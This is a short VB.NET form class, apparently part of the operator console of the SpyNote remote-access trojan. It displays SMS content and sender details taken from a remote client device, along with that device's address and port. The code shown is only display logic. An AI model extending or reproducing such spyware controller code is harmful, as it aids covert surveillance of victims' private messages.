Imports Spy_Note.etonyps

Public Class editor_sms
    Public handle_SMS As Integer
    Public handle_Number_Client As Integer
    Public Client_remote_Address As String
    Public Name_Client As String
    Public Client_ID As String
    Public sender_name As String
    Public sender_number As String
    Public Sub editor_sms_00(data As String)
        Me.RichTextBox1.Text = data
    End Sub

    Private Sub editor_sms_Load(sender As Object, e As EventArgs) Handles Me.Load
        Me.RichTextBox1.ContextMenuStrip = store_0.ContextMenu1
        MyBase.Icon = store_0.icons_0("window")
        Dim text As String = String.Format("SMS Editor - Remote Address & Port: {0} Client Name: {1} Name: {2} Number: {3}", New Object() {Me.Client_remote_Address, Me.Name_Client, Me.sender_name, Me.sender_number})
        Me.Text = text
    End Sub
End Class